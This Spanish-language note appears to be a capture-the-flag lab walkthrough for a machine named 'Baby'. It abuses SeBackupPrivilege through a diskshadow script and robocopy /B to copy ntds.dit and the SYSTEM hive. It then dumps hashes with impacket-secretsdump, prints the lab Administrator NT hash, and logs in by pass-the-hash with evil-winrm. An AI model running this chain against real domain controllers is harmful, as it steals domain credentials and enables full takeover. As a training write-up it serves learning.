#ntdsdit #SeBackupPrivilege #serestoreprivilage #diskshadow

---
NTDS.DIT con SeBackupPrivilege + SeRestorePrivilege
Vamos a copiar el archivo ntds para luego con [[impacket-secretsdump]] dumpear el hash

---

Usamos el comando [[whoami]] con `whoami /all`
Vemos que tenemos los permisos de SeBackupPrivilege + SeRestorePrivilege


Con [[nvim]] vamos crear un archivo con el siguiente contenido y lo vamos a poner en un archivo que se llama exploit.txt

```
set context persistent nowriters
set metadata c:\programdata\df.cab
set verbose on
add volume c: alias df
create
expose %df% z:
```

Ahora con [[unix2dos]] usando `unix2dos exploit.txt` para que reconozca bien los finales de linea y lea todo el contenido, ya que cuando lo ejecutaba sin pasarle el unix2dos no me detectaba todo el codigo
![[Baby24.png]]
Vamos a subir el archivo *exploit.txt* usando el comando `upload exploit.txt` que tiene [[evil-winrm]]
Con el comando `diskshadow /s exploit.txt` vamos a ejecutar las instrucciones tenemos en el exploit.txt
![[Baby25.png]]
Ya se nos creo una nueva particion que es la *z* donde esta el archivo *ntds.dit* ubicado en *z:/Windows/ntds/ntds.dit*


En la particion de *C:* cree una carpeta con [[mkdir]] usando el comando `mkdir tmp` que se llama tmp para trabajar en ese directorio mas comodamente. y con [[cd]] usamos ``cd C:/tmp`` ya nos vamos a quedar en el directorio
Con la herramienta [[robocopy]] vamos a usar el comando `robocopy /B z:\Windows\NTDS . ntds.dit` para copiar el archivo ntds.dit al directorio actual de trabajo que en este caso es la carpeta tmp


![[Baby28.png]]

![[Baby29.png]]
con `download ntds.dit` vamos a descargar el archivo a nuestra maquina de atacante

Vamos a usar `reg save hklm\system c:\tmp\system` para guardar un archivo de la rama del registro de windows
![[Baby27.png]]
Y despues con `download system` vamos a descargar el archivo a nuestra maquina de ata cante
# Con [[impacket-secretsdump]] vamos a dumpear el hash del usuario administrator

```
sudo impacket-secretsdump -system system -ntds ntds.dit LOCAL
```

![[Baby32.png]]
Obtenemos las credenciales administrator:ee4457ae59f1e3fbd764e33d9cef123d

Ahora con [[evil-winrm]] nos vamos a conectar 
``evil-winrm -i baby.vl -u "Administrator" -H "ee4457ae59f1e3fbd764e33d9cef123d" -P 5985``
![[Baby30.png]]
Ya podemos catear la flag